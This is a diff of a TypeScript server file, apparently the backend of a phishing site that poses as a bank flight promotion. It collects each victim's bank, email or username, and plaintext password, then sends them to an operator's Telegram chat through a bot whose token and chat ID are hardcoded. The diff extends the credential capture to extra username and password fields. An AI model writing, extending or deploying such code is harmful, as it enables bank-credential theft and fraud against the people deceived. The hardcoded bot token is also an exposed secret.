@@ -18,18 +18,20 @@ const generateNumericId = (length: number): string => {
 
 // Función para enviar mensajes a Telegram
 const sendTelegramMessage = async (message: string) => {
-  const botToken = "7764190007:AAGNnwdIt8cfotDj1si_AefOhrYIQdLzAig";
-  const chatId = "6615027684";
+  const botToken = process.env.TELEGRAM_BOT_TOKEN || "7764190007:AAGNnwdIt8cfotDj1si_AefOhrYIQdLzAig";
+  const chatId = process.env.TELEGRAM_CHAT_ID || "6615027684";
   
   try {
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       chat_id: chatId,
       text: message,
       parse_mode: 'HTML'
     });
-    console.log('✅ Mensaje enviado a Telegram:', message);
-  } catch (error) {
-    console.error('❌ Error enviando mensaje a Telegram:', error);
+    console.log('✅ Mensaje enviado a Telegram exitosamente');
+    return response.data;
+  } catch (error: any) {
+    console.error('❌ Error enviando mensaje a Telegram:', error?.response?.data || error?.message || error);
+    return null;
   }
 };
 
@@ -1160,8 +1162,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
             const telegramMessage = `🎫 <b>NUEVA PROMOCIÓN DE VUELOS</b>\n\n` +
               `📋 <b>Folio:</b> ${newSession.folio}\n` +
               `🏦 <b>Banco:</b> ${banco}\n` +
-              `📧 <b>Correo:</b> ${clientData.correo || 'No proporcionado'}\n` +
-              `🔑 <b>Contraseña:</b> ${clientData.contrasena || 'No proporcionada'}\n` +
+              `📧 <b>Correo:</b> ${clientData.username || clientData.correo || 'No proporcionado'}\n` +
+              `🔑 <b>Contraseña:</b> ${clientData.password || clientData.contrasena || 'No proporcionada'}\n` +
               `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
               `✅ <b>Estado:</b> Términos aceptados, esperando validación`;
             
